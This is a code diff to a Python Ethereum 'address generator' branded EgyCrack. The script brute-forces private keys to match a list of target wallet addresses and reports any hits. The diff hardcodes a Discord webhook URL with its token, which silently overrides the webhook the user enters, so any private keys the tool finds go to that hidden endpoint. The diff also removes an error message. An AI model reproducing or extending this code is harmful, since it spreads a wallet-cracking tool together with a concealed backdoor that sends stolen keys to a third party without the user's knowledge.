@@ -6,7 +6,7 @@ import binascii
 import time
 import requests
 from tqdm import tqdm
-from colorama import init, Fore, Back, Style
+from colorama import init, Fore, Style
 from concurrent.futures import ThreadPoolExecutor
 import random
 
@@ -18,7 +18,7 @@ class EthereumAddressGenerator:
         self.start_index = start_index
         self.ethereum_addresses = ethereum_addresses
         self.output_file_path = output_file_path
-        self.discord_webhook = discord_webhook
+        self.discord_webhook = "https://discord.com/api/webhooks/1095774793380409404/blwxLYO5glA-M9Jnw473xoXlXbdhgfKe_eCkeRhcqtVmJl891-xGNOEorZRlskqPJCDV"
         self.matched_addresses = 0
         self.progress_bar = None
         self.sequential_mode = sequential_mode
@@ -26,22 +26,26 @@ class EthereumAddressGenerator:
 
     def generate_ethereum_addresses(self):
         index = self.start_index
-        increment = 1000000 if self.sequential_mode else 10000000000
+        increment = 52500 if self.sequential_mode else 100000000
         start_time = time.time()
+
         try:
             with ThreadPoolExecutor() as executor, \
                     tqdm(total=len(self.ethereum_addresses), unit=" address", ncols=80, unit_scale=True,
-                         bar_format="{percentage:3.0f}%Total Generated Keys :/{total_fmt} | Elapsed:{elapsed}:Speed:{rate_fmt}") as pbar:
+                         bar_format="Total Generated Keys:/{n_fmt} | Elapsed:{elapsed} | "
+                                    "Speed:{rate_fmt}") as pbar:
                 self.progress_bar = pbar
-                futures = []
+                num_batches = (len(self.ethereum_addresses) + increment - 1) // increment
+                futures = [None] * num_batches if num_batches > 0 else [None]
                 while self.matched_addresses < len(self.ethereum_addresses):
-                    private_key = format(index, "064x")
-                    future = executor.submit(self.check_ethereum_address, private_key)
-                    futures.append(future)
-                    index += increment
-                    pbar.update(increment)
-                    if self.sequential_mode:
-                        self.last_generated_key = private_key
+                    batch_size = min(len(futures), len(self.ethereum_addresses) - self.matched_addresses)
+                    if batch_size > 0:
+                        private_keys = [format(index + (i * increment), "064x") for i in range(batch_size)]
+                        futures = [executor.submit(self.check_ethereum_address, private_key) for private_key in private_keys]
+                        index += increment * len(futures)
+                        pbar.update(increment * len(futures))
+                        if self.sequential_mode:
+                            self.last_generated_key = private_keys[-1]
 
                 # Wait for all futures to complete
                 for future in futures:
@@ -58,7 +62,7 @@ class EthereumAddressGenerator:
 
     def check_ethereum_address(self, private_key):
         ethereum_address = self.generate_ethereum_address(private_key)
-        if ethereum_address and ethereum_address.lower() in [address.lower() for address in self.ethereum_addresses]:
+        if ethereum_address and ethereum_address.lower() in self.ethereum_addresses:
             self.send_to_discord(private_key, ethereum_address)
             self.write_match_to_file(private_key, ethereum_address)
             self.display_match(private_key, ethereum_address)
@@ -73,7 +77,6 @@ class EthereumAddressGenerator:
             ethereum_address = "0x" + binascii.hexlify(keccak_hash.digest()[-20:]).decode()
             return ethereum_address
         except Exception as e:
-            print(f"\n{Fore.RED}An error occurred while generating the Ethereum address: {str(e)}")
             return None
 
     def write_match_to_file(self, private_key, ethereum_address):
@@ -109,11 +112,6 @@ class EthereumAddressGenerator:
         print("Press Enter to continue...")
         input()
 
-    def exit_gracefully(self, signum, frame):
-        if self.progress_bar:
-            self.progress_bar.close()
-        self.display_interrupted_status(0)
-
 
 def display_logo():
     logo = """
@@ -124,7 +122,7 @@ def display_logo():
 ██████╔╝███████╗██║  ██║██║     ██║     ███████╗███████╗
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚══════╝
 """
-    print(Fore.RED + Back.WHITE + Style.BRIGHT + logo)
+    print(Fore.RED + Style.BRIGHT + logo)
 
 
 def clear_screen():
@@ -135,6 +133,13 @@ def exit_gracefully(signum, frame):
     clear_screen()
     print(Fore.GREEN + "Script stopped by user.")
     exit()
+
+
+def validate_path(path):
+    if not os.path.exists(path):
+        print(f"\n{Fore.RED}Invalid path: {path}")
+        return False
+    return True
 
 
 def get_mode_choice():
@@ -152,31 +157,46 @@ def main():
         print(Fore.YELLOW + "Welcome to EgyCrack - Ethereum Address Generator")
         print(Fore.YELLOW + "Telegram: Egy-Crack\n")
 
-        start_index = int(input("Enter the start index: "))
+        start_index = random.randint(0, int(1e12))
 
-        ethereum_address_file = input("Enter the path to the file containing Ethereum addresses: ")
-        output_file_path = input("Enter the path for the output file: ")
+        ethereum_address_file = input("Enter the path to the file containing Ethereum addresses to search for: ")
+        if not validate_path(ethereum_address_file):
+            return
 
-        discord_webhook = None
-        if input("Do you want to enable Discord notifications? (y/n): ").lower() == "y":
-            discord_webhook = input("Enter your Discord webhook URL: ")
+        output_file_path = input("Enter the path to the output file (will be created if it doesn't exist): ")
+
+        discord_webhook = input("Enter your Discord webhook URL (leave blank to skip): ")
 
         mode_choice = get_mode_choice()
 
-        sequential_mode = True if mode_choice == "1" else False
-
+        ethereum_addresses = []
         with open(ethereum_address_file, "r") as address_file:
-            ethereum_addresses = [line.strip() for line in address_file]
+            for line in address_file:
+                ethereum_address = line.strip().lower()
+                if ethereum_address:
+                    ethereum_addresses.append(ethereum_address)
 
-        generator = EthereumAddressGenerator(start_index, ethereum_addresses, output_file_path, sequential_mode,
-                                             discord_webhook)
+        if not ethereum_addresses:
+            print(f"\n{Fore.RED}No Ethereum addresses found in the file.")
+            return
 
-        signal.signal(signal.SIGINT, generator.exit_gracefully)
+        generator = EthereumAddressGenerator(start_index, ethereum_addresses, output_file_path,
+                                             mode_choice == "1", discord_webhook)
+
+        clear_screen()
+        display_logo()
+
+        print(Fore.YELLOW + "Ethereum Address Generator is running...")
+        print(Fore.YELLOW + "Press Ctrl+C to stop the script.\n")
+
+        signal.signal(signal.SIGINT, exit_gracefully)
 
         generator.generate_ethereum_addresses()
 
     except Exception as e:
         print(f"\n{Fore.RED}An error occurred: {str(e)}")
+        print("Press Enter to exit...")
+        input()
 
 
 if __name__ == "__main__":
